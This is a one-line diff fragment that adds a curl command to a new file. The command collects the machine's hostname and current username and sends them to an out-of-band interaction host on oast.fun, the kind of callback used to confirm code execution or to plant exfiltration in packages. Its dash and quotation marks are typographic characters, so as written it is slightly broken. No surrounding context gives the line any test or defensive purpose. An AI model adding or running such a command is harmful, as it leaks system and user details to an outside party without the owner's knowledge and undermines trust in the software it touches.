@@ -1,0 +1,2 @@
+curl —data-urlencode “info=$(hostname && whoami)” http://ajsmihmknadktxdrcopwoe9mhnmffc002.oast.fun
+
